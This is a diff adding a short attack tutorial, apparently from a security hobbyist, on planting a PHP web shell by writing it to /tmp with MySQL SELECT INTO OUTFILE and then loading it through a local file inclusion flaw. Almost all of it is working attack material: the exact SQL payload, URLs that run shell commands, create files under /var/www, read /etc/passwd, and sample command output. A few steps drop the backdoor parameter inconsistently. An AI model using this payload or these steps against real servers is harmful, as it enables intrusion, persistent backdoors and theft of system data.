@@ -1,0 +1,92 @@
+################################################################################
+#####									########
+#####		How to use MySQL `LOAD INTO OUTFILE' (backdoor)		########
+#####									########
+#####		Twitter: @_bl4de | 					########
+#####									########
+################################################################################
+
+requires:
+- vulnreable server
+- writable /tmp on this server
+- Local File Inclusion i WebApp on Apache server
+- access to MySQL, for examle by remote root login (CVE 2012-2122), 
+pwned phpMyAdmin or SQLi in WebApp.
+
+--------------------------------------------------------------------------------
+
+1. After succesful access to MySQL:
+
+SELECT "<?php echo '<br />ShellExec backdoor<br />'; echo '<pre>'
+.shell_exec($_GET['cmd']).'</pre>'; ?>" INTO OUTFILE "/tmp/backdoor.php";
+
+--------------------------------------------------------------------------------
+
+2. This will create file /tmp/backdoor.php
+
+--------------------------------------------------------------------------------
+
+3. In affected (LFI) WebApp:
+
+http://vulnsite.com/index.php?vulnparam=/tmp/backdoor.php&cmd='ls -l'
+
+--------------------------------------------------------------------------------
+
+4. In web browser result should be similar to:
+
+(...)
+total 8
+-rw-rw-r-- 1 rafal rafal  316 Dec  4 11:14 index.php
+drwxrwxr-x 3 rafal rafal 4096 Nov 15 12:23 nbproject
+
+(...)
+
+
+--------------------------------------------------------------------------------
+
+5. Now, we can do anything, that web server group/username can do :)
+
+--------------------------------------------------------------------------------
+
+6. Creating new folders and files:
+
+new dir:
+
+http://vulnsite.com/index.php?vulnparam=mkdir /var/www/newdir
+
+new file in previously created dir:
+
+http://vulnsite.com/index.php?vulnparam=
+/tmp/backdoor.php&cmd=echo "<?php echo 'test'; ?>" > /var/www/newdir/test.php
+
+--------------------------------------------------------------------------------
+
+7. Display any readable file:
+
+http://vulnsite.com/index.php?vulnparam=cat /etc/passwd  (classic :) )
+
+--------------------------------------------------------------------------------
+
+8. using tools like ping, traceroute:
+
+http://vulnsite.com/index.php?vulnparam=ping -c 2 www.google.com
+
+(...)
+
+PING www.google.com (46.28.247.113) 56(84) bytes of data.
+64 bytes from 46.28.247.113: icmp_req=1 ttl=59 time=18.9 ms
+64 bytes from 46.28.247.113: icmp_req=2 ttl=59 time=139 ms
+
+--- www.google.com ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 5075ms
+rtt min/avg/max/mdev = 18.991/79.281/139.571/60.290 ms
+
+(...)
+
+
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+
+
+
+
